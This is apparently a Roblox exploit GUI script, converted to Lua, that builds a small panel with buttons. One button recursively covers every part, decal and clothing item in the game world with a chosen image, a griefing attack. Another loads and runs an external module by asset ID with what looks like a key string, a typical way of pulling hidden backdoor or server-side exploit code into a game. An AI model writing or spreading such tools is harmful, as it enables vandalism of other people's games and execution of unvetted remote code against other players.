--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @Rxs
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 

designed by @Rxs
]=]

local CollectionService = game:GetService("CollectionService");
local G2L = {};

G2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;

CollectionService:AddTag(G2L["ScreenGui_1"], [[main]]);

G2L["Frame_2"] = Instance.new("Frame", G2L["ScreenGui_1"]);
G2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(79, 79, 79);
G2L["Frame_2"]["Size"] = UDim2.new(0.30469, 0, 0.23989, 0);
G2L["Frame_2"]["Position"] = UDim2.new(0.27812, 0, 0.09434, 0);


G2L["Title_3"] = Instance.new("TextLabel", G2L["Frame_2"]);
G2L["Title_3"]["BorderSizePixel"] = 0;
G2L["Title_3"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["Title_3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Title_3"]["BackgroundTransparency"] = 1;
G2L["Title_3"]["Size"] = UDim2.new(0.27179, 0, 0.11236, 0);
G2L["Title_3"]["Text"] = [[[🟢]: Zyprha]];
G2L["Title_3"]["Name"] = [[Title]];


G2L["Spam decal_4"] = Instance.new("TextButton", G2L["Frame_2"]);
G2L["Spam decal_4"]["BorderSizePixel"] = 0;
G2L["Spam decal_4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Spam decal_4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["Spam decal_4"]["Size"] = UDim2.new(0.14872, 0, 0.14607, 0);
G2L["Spam decal_4"]["Text"] = [[Decal]];
G2L["Spam decal_4"]["Name"] = [[Spam decal]];
G2L["Spam decal_4"]["Position"] = UDim2.new(0.01538, 0, 0.16854, 0);


G2L["LocalScript_5"] = Instance.new("LocalScript", G2L["Spam decal_4"]);



G2L["Idk_6"] = Instance.new("TextLabel", G2L["Frame_2"]);
G2L["Idk_6"]["TextWrapped"] = true;
G2L["Idk_6"]["BorderSizePixel"] = 0;
G2L["Idk_6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["Idk_6"]["Size"] = UDim2.new(0.24103, 0, 0.30337, 0);
G2L["Idk_6"]["Text"] = [[This gui will not be published to the public under any circumstances.]];
G2L["Idk_6"]["Name"] = [[Idk]];
G2L["Idk_6"]["Position"] = UDim2.new(0, 0, 0.70787, 0);


G2L["skybox_7"] = Instance.new("TextButton", G2L["Frame_2"]);
G2L["skybox_7"]["BorderSizePixel"] = 0;
G2L["skybox_7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["skybox_7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["skybox_7"]["Size"] = UDim2.new(0.15385, 0, 0.14607, 0);
G2L["skybox_7"]["Text"] = [[Skybox]];
G2L["skybox_7"]["Name"] = [[skybox]];
G2L["skybox_7"]["Position"] = UDim2.new(0.18462, 0, 0.16854, 0);


G2L["LocalScript_8"] = Instance.new("LocalScript", G2L["skybox_7"]);



G2L["gui_9"] = Instance.new("TextButton", G2L["Frame_2"]);
G2L["gui_9"]["BorderSizePixel"] = 0;
G2L["gui_9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["gui_9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["gui_9"]["Size"] = UDim2.new(0.15385, 0, 0.14607, 0);
G2L["gui_9"]["Text"] = [[c4n0f]];
G2L["gui_9"]["Name"] = [[gui]];
G2L["gui_9"]["Position"] = UDim2.new(0.3641, 0, 0.16854, 0);


G2L["LocalScript_a"] = Instance.new("LocalScript", G2L["gui_9"]);



G2L["UIAspectRatioConstraint_b"] = Instance.new("UIAspectRatioConstraint", G2L["Frame_2"]);
G2L["UIAspectRatioConstraint_b"]["AspectRatio"] = 2.19101;


local function C_5()
	local script = G2L["LocalScript_5"];
	local button = G2L["Spam decal_4"]

button.MouseButton1Click:connect(function()
      local decalid = "113963996219842"
--wait(1)
local function spam(root)
    for _, v in ipairs(root:GetDescendants()) do
        if v:IsA("Part") or v:IsA("MeshPart") then
            local decal = Instance.new("Decal",v) decal.Texture = "rbxassetid://"..decalid decal.Face = Enum.NormalId.Front
            local decal = Instance.new("Decal",v) decal.Texture = "rbxassetid://"..decalid decal.Face = Enum.NormalId.Back
            local decal = Instance.new("Decal",v) decal.Texture = "rbxassetid://"..decalid decal.Face = Enum.NormalId.Left
            local decal = Instance.new("Decal",v) decal.Texture = "rbxassetid://"..decalid decal.Face = Enum.NormalId.Right
            local decal = Instance.new("Decal",v) decal.Texture = "rbxassetid://"..decalid decal.Face = Enum.NormalId.Top
            local decal = Instance.new("Decal",v) decal.Texture = "rbxassetid://"..decalid decal.Face = Enum.NormalId.Bottom
        elseif v:IsA("Decal") then
            v.Texture = "rbxassetid://"..decalid
        elseif v:IsA("ShirtGraphic") then
            v.Graphic = "rbxassetid://"..decalid
        elseif v:IsA("Shirt") then
            v.ShirtTemplate = "rbxassetid://"..decalid
        elseif v:IsA("Pants") then
            v.PantsTemplate = "rbxassetid://"..decalid
        end
        spam(v)
    end
end
spam(workspace)
        end)
end;
task.spawn(C_5);
local function C_8()
	local script = G2L["LocalScript_8"];
	local button = G2L["skybox_7"]

button.MouseButton1Click:connect(function()
      -- placeholder
    end)
end;
task.spawn(C_8);
local function C_a()
	local script = G2L["LocalScript_a"];
	local button = G2L["gui_9"]

button.MouseButton1Click:connect(function()
      require(94824511041258):C4N0FV16("ughuhh09")
    end)
end;
task.spawn(C_a);

return G2L["ScreenGui_1"], require;
